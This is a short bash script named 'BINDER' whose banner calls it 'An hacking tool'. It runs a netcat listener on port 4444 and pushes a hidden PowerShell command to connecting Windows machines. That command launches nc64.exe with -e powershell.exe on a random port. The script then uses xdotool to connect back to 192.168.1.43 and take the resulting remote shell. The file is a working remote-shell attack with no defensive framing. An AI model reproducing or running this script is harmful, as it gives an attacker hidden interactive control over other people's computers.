#!/bin/bash

source lib/colorcodes.sh

banner(){
    echo -e "${LMAGENTA}
    
     ______  _________ _        ______   _______  _______ 
    (  ___ \ \__   __/( (    /|(  __  \ (  ____ \(  ____ )
    | (   ) )   ) (   |  \  ( || (  \  )| (    \/| (    )|
    | (__/ /    | |   |   \ | || |   ) || (__    | (____)|
    |  __ (     | |   | (\ \) || |   | ||  __)   |     __)
    | (  \ \    | |   | | \   || |   ) || (      | (\ (   
    | )___) )___) (___| )  \  || (__/  )| (____/\| ) \ \__
    |/ \___/ \_______/|/    )_)(______/ (_______/|/   \__/
                                                          "

    echo ""
    echo -e "                    ${B}An hacking tool ${NC} "
}

miniBanner(){
    echo -e "${LMAGENTA}
    
    ___  _ _  _ ___  ____ ____ 
    |__] | |\ | |  \ |___ |__/ 
    |__] | | \| |__/ |___ |  \ 
    
    ${NC}                           "
}


casualPort()
{
        min=4445
        max=5000
        random_port=$(( RANDOM % (max-min+1) + min ))
        echo $random_port
}



listener() {
    while true; do
        echo -e "${LYELLOW}[*]${NC} ${B}Starting listener on port 4444${NC}"
        random_port=$(casualPort)
        echo -e "${LYELLOW}[*]${NC} ${B}Random port selected: $random_port${NC}"

        command="Start-Process -FilePath \"cmd.exe\" -ArgumentList \"/c start /min cmd /c nc64.exe -lp $random_port -e powershell.exe\" -WindowStyle Hidden;exit"
        echo $command | nc -lnvp 4444
        xdotool key ctrl+shift+t
        sleep 1
        xdotool key alt+shift+s
        xdotool type "connection $random_port"
        xdotool key Return
        sleep 1
        xdotool type "nc 192.168.1.43 $random_port"
        xdotool key Return
        sleep 1
        xdotool key alt+1
    done
}
banner
listener
miniBanner  

exit 0
